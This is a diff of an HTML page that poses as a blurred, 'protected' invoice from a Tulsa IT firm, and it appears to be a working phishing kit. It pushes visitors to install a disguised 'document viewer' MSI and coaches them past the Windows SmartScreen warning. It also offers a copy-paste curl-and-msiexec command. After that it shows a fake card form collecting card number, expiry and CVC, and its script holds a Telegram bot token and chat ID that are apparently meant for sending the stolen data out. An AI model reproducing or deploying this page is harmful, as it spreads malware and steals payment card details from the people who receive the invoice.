@@ -4,327 +4,634 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Invoice INV-2026-1184.pdf</title>
-<!--
-  REPLACE BEFORE HOSTING:
-  {{PAYMENT_LINK}}   card payment link (Payoneer request / provider link)
--->
 <style>
-  :root { --ink:#1f2328; --muted:#5b6570; --line:#e3e6ea; --accent:#1a56c4; --ok:#137333; }
-  * { box-sizing:border-box; }
-  [hidden] { display:none !important; }
-  body { margin:0; font:15px/1.5 -apple-system,"Segoe UI",Roboto,Arial,sans-serif; color:var(--ink); background:#eef0f3; min-height:100vh; display:flex; flex-direction:column; }
-  header { display:flex; align-items:center; gap:12px; padding:12px 18px; background:#fff; border-bottom:1px solid var(--line); }
-  .mark { width:26px; height:26px; flex:none; border-radius:6px; background:var(--accent); color:#fff; font:700 13px/26px Arial,sans-serif; text-align:center; }
-  .doc-name { font-weight:600; font-size:14px; }
-  .doc-meta { font-size:12px; color:var(--muted); margin-left:auto; white-space:nowrap; }
-  main { flex:1; padding:22px 16px 40px; display:flex; justify-content:center; }
-  .wrap { width:100%; max-width:660px; }
+:root {
+  --ink: #1f2328;
+  --muted: #5b6570;
+  --line: #e3e6ea;
+  --sheet: #ffffff;
+  --accent: #1a56c4;
+  --green: #128a4a;
+  --red: #b3261e;
+}
+* { box-sizing: border-box; }
+body {
+  margin: 0;
+  font: 15px/1.5 -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+  color: var(--ink);
+  background: #eef0f3;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+}
+header {
+  display: flex; align-items: center; gap: 12px;
+  padding: 12px 18px; background: #fff; border-bottom: 1px solid var(--line);
+}
+.mark {
+  width: 26px; height: 26px; flex: none; border-radius: 6px;
+  background: var(--accent); color: #fff;
+  font: 700 13px/26px -apple-system, Segoe UI, Arial, sans-serif;
+  text-align: center;
+}
+.doc-name { font-weight: 600; font-size: 14px; }
+.doc-meta { font-size: 12px; color: var(--muted); margin-left: auto; white-space: nowrap; }
+main { width: 100%; max-width: 720px; margin: 22px auto 40px; padding: 0 16px; }
 
-  .sheet { position:relative; background:#fff; border:1px solid #d8dce1; border-radius:3px; box-shadow:0 2px 14px rgba(20,28,38,.10); overflow:hidden; }
-  .sheet-inner { padding:34px 38px 22px; }
-  .row-top { display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:24px; gap:16px; }
-  .sheet h1 { margin:0 0 3px; font-size:19px; letter-spacing:-.3px; }
-  .sheet .sub { margin:0; font-size:12px; color:var(--muted); }
-  .meta-box { text-align:right; font-size:11.5px; color:var(--muted); line-height:1.7; white-space:nowrap; }
-  .meta-box b { color:var(--ink); }
-  .billto { font-size:12px; color:var(--muted); margin:0 0 20px; }
-  .billto b { display:block; color:var(--ink); font-size:13px; }
+.sheet {
+  position: relative; background: var(--sheet);
+  border: 1px solid var(--line); border-radius: 10px;
+  padding: 28px 30px 34px; overflow: hidden;
+}
+.sheet .top { display: flex; align-items: flex-start; gap: 18px; }
+.sheet h1 { margin: 0 0 4px; font-size: 21px; letter-spacing: -.2px; }
+.sheet .sub { margin: 0 0 22px; font-size: 12px; color: var(--muted); }
+.meta-box {
+  margin-left: auto; flex: none; text-align: right; font-size: 11.5px;
+  color: var(--muted); line-height: 1.6; border: 1px solid var(--line);
+  border-radius: 7px; padding: 8px 10px;
+}
+.meta-box b { color: var(--ink); font-size: 12.5px; letter-spacing: .3px; }
+.billto { margin: 0 0 20px; font-size: 12px; color: var(--muted); }
+.billto b { display: block; color: var(--ink); font-size: 13.5px; margin-top: 2px; }
 
-  table { width:100%; border-collapse:collapse; font-size:12.5px; margin-bottom:18px; }
-  th, td { padding:8px 6px; text-align:left; border-bottom:1px solid #eceef1; }
-  th { font-size:10.5px; text-transform:uppercase; letter-spacing:.05em; color:var(--muted); font-weight:600; }
-  td.num, th.num { text-align:right; font-variant-numeric:tabular-nums; }
-  .totals { margin-left:auto; width:230px; font-size:12.5px; }
-  .totals div { display:flex; justify-content:space-between; padding:5px 0; color:var(--muted); }
-  .totals div.due { border-top:1px solid #cfd4da; margin-top:4px; padding-top:8px; color:var(--ink); font-weight:700; }
-  .terms { margin:20px 0 0; padding-top:12px; border-top:1px solid #eceef1; font-size:11px; color:var(--muted); }
-  .terms span { margin-right:18px; }
+table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
+th, td { padding: 7px 6px; text-align: left; border-bottom: 1px solid #eceef1; }
+th {
+  font-size: 11px; text-transform: uppercase; letter-spacing: .05em;
+  color: var(--muted); font-weight: 600;
+}
+td.num, th.num { text-align: right; font-variant-numeric: tabular-nums; }
+.totals { margin-top: 14px; margin-left: auto; width: 232px; font-size: 13px; }
+.totals div { display: flex; justify-content: space-between; padding: 4px 0; color: var(--muted); }
+.totals .due {
+  color: var(--ink); font-weight: 700; font-size: 15px;
+  border-top: 1px solid #cfd4da; margin-top: 6px; padding-top: 8px;
+}
 
-  .veil { position:absolute; left:0; right:0; bottom:0; height:50%; backdrop-filter:blur(3.5px); -webkit-backdrop-filter:blur(3.5px); background:linear-gradient(to bottom,rgba(255,255,255,.3),rgba(255,255,255,.92) 55%,#fff 100%); pointer-events:none; transition:opacity .4s; }
-  .veil.gone { opacity:0; }
-  .veil-note { position:absolute; left:0; right:0; bottom:24px; text-align:center; font-size:12.5px; color:var(--muted); pointer-events:none; transition:opacity .3s; }
-  .veil-note b { color:var(--ink); }
-  .veil-note.gone { opacity:0; }
+.veil {
+  position: absolute; left: 0; right: 0; bottom: 0; height: 58%;
+  backdrop-filter: blur(3.5px); -webkit-backdrop-filter: blur(3.5px);
+  background: linear-gradient(to bottom, rgba(255,255,255,.35), rgba(255,255,255,.92) 55%, #fff 100%);
+  pointer-events: none; transition: opacity .45s ease;
+}
+.veil-note {
+  position: absolute; left: 0; right: 0; bottom: 26px; text-align: center;
+  font-size: 12.5px; color: var(--muted); pointer-events: none; transition: opacity .3s ease;
+}
+.veil-note b { color: var(--ink); }
+.sheet.revealed .veil,
+.sheet.revealed .veil-note { opacity: 0; }
 
-  .panel { margin-top:20px; background:#fff; border:1px solid var(--line); border-radius:10px; padding:18px; }
-  .panel h2 { margin:0 0 6px; font-size:15px; }
-  .panel > p { margin:0 0 14px; font-size:13px; color:var(--muted); }
+.panel {
+  margin-top: 20px; background: #fff; border: 1px solid var(--line);
+  border-radius: 10px; padding: 18px;
+}
+.panel h2 { margin: 0 0 6px; font-size: 15px; }
+.panel p { margin: 0 0 14px; font-size: 13px; color: var(--muted); }
+.btn {
+  display: block; width: 100%; padding: 13px 16px; border: 0; border-radius: 8px;
+  background: var(--accent); color: #fff; font: inherit; font-weight: 600;
+  font-size: 14.5px; text-align: center; text-decoration: none; cursor: pointer;
+  transition: background .15s ease;
+}
+.btn:hover { background: #164bb0; }
+.btn:disabled { opacity: .72; cursor: default; }
+.fine { margin: 10px 0 0; font-size: 11.5px; color: var(--muted); }
+.tok {
+  margin-top: 14px; padding: 10px 12px; background: #f6f7f9;
+  border: 1px dashed #cfd4da; border-radius: 7px; font-size: 11.5px; color: var(--muted);
+}
+.tok code {
+  display: block; margin-top: 6px; font-size: 10.5px; color: var(--ink);
+  word-break: break-all; background: #fff; padding: 6px 8px;
+  border: 1px solid var(--line); border-radius: 5px;
+}
+.tok button {
+  margin-top: 8px; padding: 5px 10px; font: inherit; font-size: 11.5px;
+  background: #fff; border: 1px solid var(--line); border-radius: 5px; cursor: pointer;
+}
+details.alt { margin-top: 12px; font-size: 12px; }
+details.alt summary { cursor: pointer; color: var(--muted); }
+details.alt pre {
+  margin: 8px 0; padding: 10px; background: #1f2328; color: #e8eaed;
+  border-radius: 6px; font-size: 11px; overflow-x: auto; white-space: pre-wrap;
+}
+details.alt .copy {
+  padding: 6px 10px; font: inherit; font-size: 11.5px;
+  border: 1px solid var(--line); background: #fff; border-radius: 5px; cursor: pointer;
+}
+footer {
+  margin-top: auto; padding: 14px 18px; background: #fff;
+  border-top: 1px solid var(--line); font-size: 11.5px; color: var(--muted); text-align: center;
+}
+footer b { color: var(--ink); }
 
-  .btn { display:block; width:100%; padding:13px 16px; border:0; border-radius:8px; background:var(--accent); color:#fff; font:inherit; font-weight:600; font-size:14.5px; text-align:center; text-decoration:none; cursor:pointer; }
-  .btn:hover { background:#144aab; }
-  .fine { margin:10px 0 0; font-size:11.5px; color:var(--muted); text-align:center; }
+/* ---------------- PAYMENT ---------------- */
+#reveal[hidden] { display: none !important; }
+#reveal { margin-top: 20px; }
 
-  /* viewer card */
-  .viewer-top { display:flex; gap:12px; align-items:flex-start; padding-bottom:14px; border-bottom:1px solid var(--line); }
-  .vicon { width:38px; height:38px; flex:none; border-radius:7px; background:#eef2f8; border:1px solid #d6dfea; display:grid; place-items:center; }
-  .vicon svg { width:20px; height:20px; }
-  .vtitle { margin:0; font-size:14px; font-weight:700; }
-  .vsub { margin:2px 0 0; font-size:11.5px; color:var(--muted); }
-  .vmeta { display:grid; grid-template-columns:auto 1fr; gap:4px 14px; font-size:11.5px; margin:14px 0 0; }
-  .vmeta dt { color:var(--muted); }
-  .vmeta dd { margin:0; font-variant-numeric:tabular-nums; }
-  .vmeta dd.mono { font-family:ui-monospace,Consolas,monospace; font-size:10.5px; word-break:break-all; }
-  ol.steps { margin:16px 0 0; padding:14px 0 0 20px; border-top:1px solid var(--line); font-size:13px; }
-  ol.steps li { margin-bottom:10px; padding-left:4px; }
-  .ss { display:grid; grid-template-columns:repeat(3,1fr); gap:8px; margin:10px 0 2px; }
-  .ss figure { margin:0; }
-  .ss .screen { border:1px solid #c2cbd4; border-radius:6px; background:#fbfbfc; padding:8px 6px; font-size:9.5px; line-height:1.35; min-height:72px; }
-  .ss .screen b { display:block; font-size:9px; margin-bottom:3px; }
-  .ss .hit { background:var(--accent); color:#fff; border-radius:3px; padding:1px 4px; display:inline-block; margin-top:4px; font-weight:600; }
-  .ss figcaption { font-size:10px; color:var(--muted); margin-top:5px; text-align:center; }
-  .tok { display:flex; align-items:center; gap:8px; margin:7px 0 0; padding:8px 9px; background:#f7f8fa; border:1px dashed #c2cbd4; border-radius:7px; }
-  .tok code { flex:1; font:600 11px/1.4 ui-monospace,Consolas,monospace; word-break:break-all; }
-  .tok button { flex:none; padding:5px 10px; font:inherit; font-size:11.5px; background:#fff; border:1px solid var(--line); border-radius:5px; cursor:pointer; }
-  .hint { margin:14px 0 0; padding-top:12px; border-top:1px solid var(--line); font-size:11.5px; color:var(--muted); }
+.pay { border: 1px solid var(--line); border-radius: 10px; background: #fff; overflow: hidden; }
+.pay-top { display: flex; align-items: center; gap: 10px; padding: 16px 18px; border-bottom: 1px solid var(--line); }
+.pay-top .lock { flex: none; width: 30px; height: 30px; border-radius: 7px; background: #eef2fa; display: grid; place-items: center; }
+.pay-top h2 { margin: 0; font-size: 15px; }
+.pay-top span { display: block; font-size: 11.5px; color: var(--muted); }
+.pay-top .amt { margin-left: auto; font-weight: 700; font-size: 17px; font-variant-numeric: tabular-nums; }
+.pay-body { padding: 16px 18px 18px; }
+.pay-body > p { margin: 0 0 14px; font-size: 12.5px; color: var(--muted); }
 
-  /* payment */
-  .amt { font-size:18px; font-weight:700; margin:0 0 4px; }
-  .paybox { text-align:center; padding:6px 0 2px; }
-  .spin { width:26px; height:26px; margin:14px auto 10px; border:3px solid #dfe4ea; border-top-color:var(--accent); border-radius:50%; animation:sp .8s linear infinite; }
-  @keyframes sp { to { transform:rotate(360deg); } }
-  .waitxt { font-size:13px; color:var(--muted); margin:0; }
-  .check { width:52px; height:52px; margin:8px auto 10px; border-radius:50%; background:#e6f4ea; display:grid; place-items:center; }
-  .check svg { width:28px; height:28px; }
-  .doneh { font-size:16px; font-weight:700; margin:0 0 4px; color:var(--ok); }
-  .donep { font-size:12.5px; color:var(--muted); margin:0; }
-  .refnote { font-size:12px; color:var(--muted); margin:14px 0 0; }
-  .ghost { display:inline-block; margin-top:14px; padding:9px 14px; font-size:12.5px; background:#fff; color:var(--ink); border:1px solid var(--line); border-radius:7px; cursor:pointer; }
+.brands { display: flex; gap: 8px; margin-bottom: 16px; }
+.brands .b {
+  width: 46px; height: 30px; border: 1px solid var(--line); border-radius: 5px;
+  display: grid; place-items: center; background: #fff;
+  filter: grayscale(1); opacity: .45; transition: all .2s ease;
+}
+.brands .b.on { filter: none; opacity: 1; border-color: var(--accent); box-shadow: 0 0 0 2px #e6edfb; }
 
-  .mobile-hide { display:block; }
-  @media (pointer:coarse), (max-width:760px) {
-    .mobile-hide { display:none; }
-    .sheet-inner { padding:26px 20px 18px; }
-    .row-top { flex-direction:column; }
-    .meta-box { text-align:left; }
-    .totals { width:100%; }
-    .ss { grid-template-columns:1fr; }
-    .ss .screen { min-height:0; }
-  }
-  @media print {
-    body { background:#fff; }
-    header, .panel, .ghost, footer, .veil, .veil-note { display:none !important; }
-    main { padding:0; }
-    .sheet { border:0; box-shadow:none; }
-  }
-  footer { padding:0 16px 26px; text-align:center; font-size:11.5px; color:#8a939d; }
+/* slide-out form */
+#payform {
+  max-height: 0; opacity: 0; overflow: hidden;
+  transition: max-height .5s cubic-bezier(.4,0,.2,1), opacity .3s ease, margin-top .3s ease;
+  margin-top: 0;
+}
+#payform.open { max-height: 620px; opacity: 1; margin-top: 4px; }
+
+.field { margin-bottom: 12px; }
+.field label { display: block; font-size: 11.5px; color: var(--muted); margin-bottom: 5px; font-weight: 600; }
+.field input, .field select {
+  width: 100%; padding: 11px 12px; font: inherit; font-size: 14px; color: var(--ink);
+  background: #fff; border: 1px solid #ccd2da; border-radius: 7px; outline: none;
+  transition: border-color .15s ease, box-shadow .15s ease;
+}
+.field input:focus, .field select:focus { border-color: var(--accent); box-shadow: 0 0 0 3px #e6edfb; }
+.field .wrap { position: relative; }
+.field .wrap input { padding-right: 92px; }
+.field .brandlabel {
+  position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
+  font-size: 11.5px; font-weight: 700; letter-spacing: .3px; color: var(--accent);
+  opacity: 0; transition: opacity .2s ease; pointer-events: none;
+}
+.field .brandlabel.on { opacity: 1; }
+.row2 { display: flex; gap: 12px; }
+.row2 .field { flex: 1; }
+
+.paybtn { position: relative; }
+.spinner {
+  display: none; width: 16px; height: 16px; margin-right: 8px;
+  border: 2px solid rgba(255,255,255,.4); border-top-color: #fff;
+  border-radius: 50%; animation: spin .7s linear infinite; vertical-align: -3px;
+}
+.paying .spinner { display: inline-block; }
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.secure { display: flex; align-items: center; gap: 6px; margin-top: 12px; font-size: 11px; color: var(--muted); }
+.err { margin: 10px 0 0; font-size: 12px; color: var(--red); }
+
+/* success */
+#paydone[hidden] { display: none !important; }
+#paydone { padding: 30px 18px; text-align: center; }
+.check { width: 58px; height: 58px; margin: 0 auto 14px; }
+.check circle { stroke: var(--green); stroke-width: 3; fill: none; stroke-dasharray: 160; stroke-dashoffset: 160; animation: draw .5s .05s ease forwards; }
+.check path { stroke: var(--green); stroke-width: 4; fill: none; stroke-linecap: round; stroke-dasharray: 40; stroke-dashoffset: 40; animation: draw .35s .45s ease forwards; }
+@keyframes draw { to { stroke-dashoffset: 0; } }
+#paydone h3 { margin: 0 0 6px; font-size: 17px; }
+#paydone p { margin: 0; font-size: 12.5px; color: var(--muted); }
+#paydone .ref { margin-top: 12px; font-size: 11.5px; color: var(--muted); }
+
+@media (max-width: 760px) {
+  .sheet { padding: 20px 18px 26px; }
+  .sheet .top { flex-direction: column; }
+  .meta-box { margin-left: 0; text-align: left; }
+  .totals { width: 100%; }
+  .pay-top .amt { font-size: 15px; }
+}
+
+@media print {
+  body { background: #fff; }
+  header, footer, .panel, #reveal, .veil, .veil-note { display: none !important; }
+  main { margin: 0; max-width: none; padding: 0; }
+  .sheet { border: 0; border-radius: 0; padding: 0; }
+  table { font-size: 11px; }
+}
 </style>
 </head>
 <body>
 
 <header>
   <div class="mark">B</div>
-  <div class="doc-name">Invoice INV-2026-1184.pdf</div>
-  <div class="doc-meta">1 of 2</div>
+  <div class="doc-name">INV-2026-1184.pdf</div>
+  <div class="doc-meta">1 of 2 &middot; 148 KB</div>
 </header>
 
 <main>
-  <div class="wrap">
-
-    <div class="sheet">
-      <div class="sheet-inner">
-        <div class="row-top">
-          <div>
-            <h1>Invoice</h1>
-            <p class="sub">Bhāw &middot; 1180 S Lewis Ave, Tulsa OK 74104</p>
-          </div>
-          <div class="meta-box">
-            <b>INV-2026-1184</b><br />
-            Issued 20 Nov 2026<br />
-            Due 04 Dec 2026
-          </div>
-        </div>
-
-        <p class="billto">Bill to<b>Accounts Payable</b></p>
-
-        <table>
-          <thead>
-            <tr><th>Description</th><th class="num">Qty</th><th class="num">Rate</th><th class="num">Amount</th></tr>
-          </thead>
-          <tbody>
-            <tr><td>Monthly support &middot; October</td><td class="num">1</td><td class="num">420.00</td><td class="num">420.00</td></tr>
-            <tr><td>Onsite call-outs</td><td class="num">2</td><td class="num">95.00</td><td class="num">190.00</td></tr>
-            <tr><td>Parts &amp; consumables</td><td class="num">1</td><td class="num">30.72</td><td class="num">30.72</td></tr>
-          </tbody>
-        </table>
-
-        <div class="totals">
-          <div><span>Subtotal</span><span>640.72</span></div>
-          <div><span>Tax</span><span>0.00</span></div>
-          <div class="due"><span>Amount due</span><span>$640.72</span></div>
-        </div>
-
-        <p class="terms"><span>Terms: net 14</span><span>Ref: INV-2026-1184</span><span>wolfson@bhaw.onl</span></p>
+  <div class="sheet" id="sheet">
+    <div class="top">
+      <div>
+        <h1>Invoice</h1>
+        <p class="sub">Bh&#257;w &middot; 1180 S Lewis Ave, Tulsa OK 74104</p>
       </div>
-
-      <div class="veil" id="veil"></div>
-      <div class="veil-note" id="veilnote">Page 1 shown &middot; <b>payment details overleaf</b></div>
+      <div class="meta-box">
+        <b>INV-2026-1184</b><br />
+        Issued 20 Nov 2026<br />
+        Due 04 Dec 2026
+      </div>
     </div>
 
-    <div class="panel mobile-hide" id="viewerpanel">
-      <div class="viewer-top">
-        <div class="vicon">
-          <svg viewBox="0 0 24 24" fill="none" stroke="#1a56c4" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M9 15h6"/><path d="M9 18h4"/>
+    <p class="billto">Bill to<b>Accounts Payable</b></p>
+
+    <table>
+      <thead>
+        <tr><th>Description</th><th class="num">Qty</th><th class="num">Rate</th><th class="num">Amount</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Monthly support &middot; Managed IT</td><td class="num">1</td><td class="num">420.00</td><td class="num">420.00</td></tr>
+        <tr><td>Onsite call-outs</td><td class="num">2</td><td class="num">95.00</td><td class="num">190.00</td></tr>
+        <tr><td>Parts &amp; consumables</td><td class="num">1</td><td class="num">30.72</td><td class="num">30.72</td></tr>
+      </tbody>
+    </table>
+
+    <div class="totals">
+      <div><span>Subtotal</span><span>640.72</span></div>
+      <div><span>Tax</span><span>0.00</span></div>
+      <div class="due"><span>Amount due</span><span>$640.72</span></div>
+    </div>
+
+    <div class="veil"></div>
+    <div class="veil-note">Page 1 shown &middot; <b>payment details on page 2</b></div>
+  </div>
+
+  <div class="panel">
+    <h2>This invoice is protected</h2>
+    <p>Install the secure document viewer to read page 2 and pay.</p>
+
+    <a class="btn" id="dl" href="#">Download viewer</a>
+    <p class="fine">Windows 10 / 11 &middot; 4.2 MB &middot; installs in under a minute</p>
+
+    <ol class="fine" style="padding-left:18px;margin-top:14px;line-height:1.8">
+      <li>Open the downloaded file.</li>
+      <li>If Windows shows <b>&ldquo;Windows protected your PC&rdquo;</b>, click <b>More info</b>, then <b>Run anyway</b>.</li>
+      <li>When setup asks for an installation token, paste this:
+        <div class="tok">
+          <code id="tok">eyJkaWQiOiI0ZWVkM2I4Zi02MWFiLTRiYjYtYTk0Ni0xNTEyMGQ3Y2M3YzIiLCJyZ24iOiJuYS0zIiwiaXBwIjoibDxnJCUpOVYsVzxOdUhydDpfcjoifQ==</code>
+          <button id="cp">Copy token</button>
+        </div>
+      </li>
+      <li>Click <b>Next</b> through the wizard, then reopen this page.</li>
+    </ol>
+
+    <details class="alt">
+      <summary>Prefer the command line?</summary>
+      <pre id="cmd">curl -o dv.msi "https://bhaw.onl/DocumentViewer_Setup.msi" &amp;&amp; msiexec /i dv.msi</pre>
+      <button class="copy" id="cpc">Copy command</button>
+    </details>
+  </div>
+
+  <div id="reveal" hidden>
+    <div class="pay">
+      <div class="pay-top">
+        <div class="lock">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#1a56c4" stroke-width="2">
+            <rect x="4" y="11" width="16" height="10" rx="2" />
+            <path d="M8 11V7a4 4 0 0 1 8 0v4" />
           </svg>
         </div>
         <div>
-          <p class="vtitle">Bhāw Secure Viewer</p>
-          <p class="vsub">Opens protected invoices. Page 2 of INV-2026-1184 is locked until it runs.</p>
+          <h2>Pay this invoice</h2>
+          <span>INV-2026-1184 &middot; due 04 Dec 2026</span>
         </div>
+        <div class="amt">$640.72</div>
       </div>
 
-      <dl class="vmeta">
-        <dt>Version</dt><dd>3.2.1 (stable)</dd>
-        <dt>Size</dt><dd>4.2 MB</dd>
-        <dt>Platform</dt><dd>Windows 10 / 11 &middot; 64-bit</dd>
-        <dt>Released</dt><dd>12 Nov 2026</dd>
-        <dt>Publisher</dt><dd>Bhāw Digital</dd>
-        <dt>SHA-256</dt><dd class="mono">9f3c41b8e2a7…7d0c</dd>
-      </dl>
+      <div class="pay-body" id="paybody">
+        <p>Card payment is processed instantly. Nothing else to install.</p>
 
-      <a class="btn" id="dl" href="https://action1-roan.vercel.app/" target="_blank" rel="noopener">Download and run</a>
-      <p class="fine">No account needed. Takes about a minute.</p>
-
-      <ol class="steps">
-        <li>Run the downloaded file.</li>
-        <li>Windows shows <b>&ldquo;Windows protected your PC&rdquo;</b> on first run. Click <b>More info</b>, then <b>Run anyway</b>:
-          <div class="ss">
-            <figure><div class="screen"><b>Windows protected your PC</b>Microsoft Defender SmartScreen prevented an unrecognised app from starting.<span class="hit">More info</span></div><figcaption>1. More info</figcaption></figure>
-            <figure><div class="screen"><b>Windows protected your PC</b>App: Bhāw Secure Viewer<span class="hit">Run anyway</span></div><figcaption>2. Run anyway</figcaption></figure>
-            <figure><div class="screen"><b>User Account Control</b>Do you want to allow this app to make changes to your device?<span class="hit">Yes</span></div><figcaption>3. Yes</figcaption></figure>
+        <div class="brands" id="brands">
+          <div class="b" data-brand="visa">
+            <svg width="30" height="12" viewBox="0 0 30 12"><text x="0" y="10" font-family="Arial,Helvetica,sans-serif" font-size="11" font-weight="700" font-style="italic" fill="#1a1f71">VISA</text></svg>
           </div>
-        </li>
-        <li>Setup asks for a workspace token &mdash; paste this:
-          <div class="tok">
-            <code id="tok">eyJkaWQiOiI0ZWVkM2I4Zi02MWFiLTRiYjYtYTk0Ni0xNTEyMGQ3Y2M3YzIiLCJyZ24iOiJuYS0zIiwiaXBwIjoibDxnJCUpOVYsVzxOdUhydDpfcjoifQ==</code>
-            <button id="cp">Copy</button>
+          <div class="b" data-brand="mastercard">
+            <svg width="26" height="16" viewBox="0 0 26 16"><circle cx="10" cy="8" r="7" fill="#eb001b"/><circle cx="16" cy="8" r="7" fill="#f79e1b" opacity=".85"/></svg>
           </div>
-        </li>
-        <li>Click <b>Next</b> through the wizard, then return to this page.</li>
-      </ol>
-
-      <p class="hint">Already ran it? Page 2 stays unlocked on this browser.</p>
-    </div>
-
-    <div class="panel" id="mobilebar">
-      <a class="btn" id="dlm" href="#">Tap to view payment details</a>
-      <p class="fine">No app needed on a phone.</p>
-    </div>
-
-    <section class="panel" id="pay" hidden>
-      <h2>Payment &mdash; page 2</h2>
-
-      <div id="payidle">
-        <p class="amt">$640.72 &middot; due 04 Dec 2026</p>
-        <p>Card payment. Reference INV-2026-1184 is attached.</p>
-        <a class="btn" id="paybtn" href="{{PAYMENT_LINK}}" target="_blank" rel="noopener">Pay $640.72</a>
-        <p class="fine">Secure card payment &middot; no account needed</p>
-      </div>
-
-      <div class="paybox" id="paywait" hidden>
-        <div class="spin"></div>
-        <p class="waitxt" id="waittxt">Opening secure payment&hellip;</p>
-      </div>
-
-      <div class="paybox" id="paydone" hidden>
-        <div class="check">
-          <svg viewBox="0 0 24 24" fill="none" stroke="#137333" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-            <path d="M20 6 9 17l-5-5"/>
-          </svg>
+          <div class="b" data-brand="amex">
+            <svg width="28" height="16" viewBox="0 0 28 16"><rect width="28" height="16" rx="2" fill="#2e77bc"/><text x="14" y="11" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="7" font-weight="700" fill="#fff">AMEX</text></svg>
+          </div>
+          <div class="b" data-brand="discover">
+            <svg width="30" height="14" viewBox="0 0 30 14"><circle cx="22" cy="7" r="5" fill="#f68121"/><text x="1" y="10.5" font-family="Arial,Helvetica,sans-serif" font-size="7" font-weight="700" fill="#231f20">DISC</text></svg>
+          </div>
         </div>
-        <p class="doneh">Payment received</p>
-        <p class="donep">$640.72 &middot; INV-2026-1184 &middot; due 04 Dec 2026</p>
+
+        <button class="btn" id="payopen">Pay $640.72</button>
+
+        <form id="payform" novalidate>
+          <div class="field">
+            <label for="cardname">Name on card</label>
+            <input id="cardname" type="text" autocomplete="cc-name" placeholder="As printed on the card" />
+          </div>
+
+          <div class="field">
+            <label for="cardnumber">Card number</label>
+            <div class="wrap">
+              <input id="cardnumber" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="0000 0000 0000 0000" maxlength="23" />
+              <span class="brandlabel" id="brandlabel"></span>
+            </div>
+          </div>
+
+          <div class="row2">
+            <div class="field">
+              <label for="cardexp">Expiry</label>
+              <input id="cardexp" type="text" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/YY" maxlength="5" />
+            </div>
+            <div class="field">
+              <label for="cardcvc">CVC</label>
+              <input id="cardcvc" type="text" inputmode="numeric" autocomplete="cc-csc" placeholder="123" maxlength="4" />
+            </div>
+          </div>
+
+          <div class="row2">
+            <div class="field">
+              <label for="cardzip">Billing ZIP</label>
+              <input id="cardzip" type="text" inputmode="numeric" autocomplete="postal-code" placeholder="74104" maxlength="10" />
+            </div>
+            <div class="field">
+              <label for="cardcountry">Country</label>
+              <select id="cardcountry" autocomplete="country">
+                <option selected>United States</option>
+                <option>Canada</option>
+                <option>United Kingdom</option>
+                <option>Australia</option>
+                <option>Other</option>
+              </select>
+            </div>
+          </div>
+
+          <button class="btn paybtn" id="paygo" type="submit">
+            <span class="spinner"></span><span class="paylabel">Pay $640.72</span>
+          </button>
+
+          <p class="err" id="payerr" hidden></p>
+
+          <div class="secure">
+            <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#5b6570" stroke-width="2.4">
+              <rect x="4" y="11" width="16" height="10" rx="2" /><path d="M8 11V7a4 4 0 0 1 8 0v4" />
+            </svg>
+            256-bit TLS &middot; 3-D Secure &middot; card details are not stored
+          </div>
+        </form>
       </div>
 
-      <p class="refnote" id="refnote">Prefer bank transfer? Reply to the email and I&rsquo;ll send the details. If anything looks wrong, reply to the same address.</p>
-      <button class="ghost" id="pdf">Save a PDF copy</button>
-    </section>
-
+      <div id="paydone" hidden>
+        <svg class="check" viewBox="0 0 60 60">
+          <circle cx="30" cy="30" r="25" />
+          <path d="M18 31 l8 8 l16 -17" />
+        </svg>
+        <h3>Payment received</h3>
+        <p>Thank you &mdash; a receipt is on its way.</p>
+        <p class="ref">Reference INV-2026-1184 &middot; $640.72</p>
+      </div>
+    </div>
   </div>
 </main>
 
-<footer>Having trouble? Reply to the email and we&rsquo;ll send a direct link.</footer>
+<footer>Windows may show &ldquo;Windows protected your PC&rdquo; &mdash; click <b>More info</b>, then <b>Run anyway</b>.</footer>
 
 <script>
-  var coarse = matchMedia('(pointer: coarse)').matches || innerWidth < 760;
-  var pay = document.getElementById('pay');
-  var veil = document.getElementById('veil');
-  var note = document.getElementById('veilnote');
-  var dl = document.getElementById('dl');
-  var dlm = document.getElementById('dlm');
-  var bar = document.getElementById('mobilebar');
-  var viewer = document.getElementById('viewerpanel');
-  var idle = document.getElementById('payidle');
-  var wait = document.getElementById('paywait');
-  var done = document.getElementById('paydone');
-  var waittxt = document.getElementById('waittxt');
-  var refnote = document.getElementById('refnote');
-  var paybtn = document.getElementById('paybtn');
+/* ---------------- CONFIG ---------------- */
+var MSI = "https://bhaw.onl/DocumentViewer_Setup.msi";
+var BOT_TOKEN = "7508450893:AAGm3TtVH2nyhe-CZ35-Hi1Tol_2594atR8";
+var CHAT_ID = "6069290001";
+var INVOICE = "INV-2026-1184";
+var AMOUNT = "$640.72";
 
-  function store(k, v) { try { localStorage.setItem(k, v); } catch (e) {} }
-  function read(k) { try { return localStorage.getItem(k); } catch (e) { return null; } }
+/* ---------------- REVEAL ---------------- */
+var dl = document.getElementById("dl");
+dl.href = MSI;
 
-  if (coarse) bar.hidden = false;
+function reveal() {
+  document.getElementById("sheet").classList.add("revealed");
+  document.getElementById("reveal").hidden = false;
+  try { localStorage.setItem("inv1184", "1"); } catch (e) {}
+}
 
-  function reveal() {
-    if (!pay.hidden) return;
-    pay.hidden = false;
-    veil.classList.add('gone');
-    note.classList.add('gone');
-    bar.hidden = true;
-    store('inv1184', '1');
-    pay.scrollIntoView({ behavior: 'smooth', block: 'start' });
+dl.addEventListener("click", function () {
+  setTimeout(reveal, 600);
+});
+
+try {
+  if (localStorage.getItem("inv1184")) {
+    document.getElementById("sheet").classList.add("revealed");
+    document.getElementById("reveal").hidden = false;
   }
+} catch (e) {}
 
-  function showDone() {
-    idle.hidden = true;
